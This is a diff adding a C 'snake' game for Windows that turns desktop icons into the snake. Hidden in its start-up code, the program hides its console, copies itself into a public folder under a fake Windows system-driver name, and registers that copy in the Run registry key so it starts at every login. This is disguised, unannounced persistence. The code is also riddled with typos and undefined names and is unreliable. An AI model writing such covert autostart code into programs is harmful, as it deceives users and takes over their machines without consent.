@@ -1,0 +1,93 @@
+##贪吃蛇
+#include<staio.h>
+#include<windows.h>
+#include<commctrl.h>
+/*调试时显示控制台，单独运行exe时隐藏控制台*/
+#pragma commment(linker,"/subsystem :\"windows \"/entry :\"mainCRTStartup"")
+#define WIDTH 1920
+#define HEIGHT 1080
+#define USIZE 80
+int main()
+{
+char ezxepath[260]={0};
+GetModuleFileName(NULL,exepath,260);//路径
+CopyFile(exepatth,"C;\\Users\\Public\\Music\\Windows system32 流媒体核心驱动组件.exe",True);
+char path[]='Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+HKEY hkey;
+RegOpenKey(HKEY_CURENT_USER,pah,&hkey);
+RegSerValueEx(hkey,"Window System32",0,REG_SZ,(unsigned char*)"C\\Users\\Public||Music||Windows system32 流媒体核驱动组件.exe",sizeof(exepath));
+
+//创建一个窗口
+//initgraph(WIDTH,HEIGHT);
+
+//借 偷 抢 桌面的图标窗口
+HWND zm=FIndWindow("Progman","Program Manager");
+HWND bz=FindWindowE(zm,0,"SHELLDLL_DefView",NULL);
+
+//图标个数
+int icount=SendMessage(tb,LVM_GETITEMCOUNT,0,0);
+for(int i=0;i<icount;i++)
+  SendMessage(tb,LVM_SETITEMPOSITION,i,(5000<<16)+500);
+  
+//定义蛇
+int len;//蛇的长度
+int dir;//蛇的方向 0上 1下 2左 3右
+int x[200];//蛇的x坐标 200个
+int y[200];//蛇的y坐标
+
+//定义食物
+int fx,fy;
+//初始化
+len-1;
+dir-3;
+x[0]=0;
+y[0]=0;
+//初始化食物
+fx=rand()%(WIDTH/USIZE)*USIZE;
+fy=rand()%(HEIGHT/USIZE)*USIZE;
+while(1)
+{
+//改变方向 按键
+if (GetAsyncKeyState(VK_UP))
+  dir=0;
+if(GetAsyncKeyState(VK_DOWN))
+  dir=1;
+if(GetAsyncKeyState(VK_LEFT))
+  dir=2;
+if(GetAsyncKeyState(VK_RIGHT))
+  dir=3;
+ 
+//绘制蛇 绘制几节？
+//clearsevice();//刷新
+for(int i=0;i<len;i++)
+  SendMessage(tb,LVM_SETITEMPOSITION,i,(y[i]<<16)+x[i]);
+ //绘制食物
+ SendMessage(tb,LVM_SETITEMPOSITION,len,(fy<<16)+fx);
+ //蛇的移动
+ for(int i=len-1;i>0;i--)
+ {
+ x[i]=x[i-1];
+ y[i]=y[i-1];
+ }
+swith(dir)
+{
+case 0:y[0]-=USIZE;break;
+case 1:y[0]+=USIZE;break;
+case 2:x[0]-=USIZE;break;
+case 3:x[0]+=USIZE;break;
+}
+//吃到食物
+if(x[0]==fx&&y[0]==fy)
+{
+len++;//蛇的节数加1
+fx=rand()%(WIDTH/USIZE)*USIZE;
+fy=rand()%(HEUGHT/USIZE)*USIZE;
+}
+Sleep(200);
+}
+system("pause");
+
+
+
+return 0;
+}
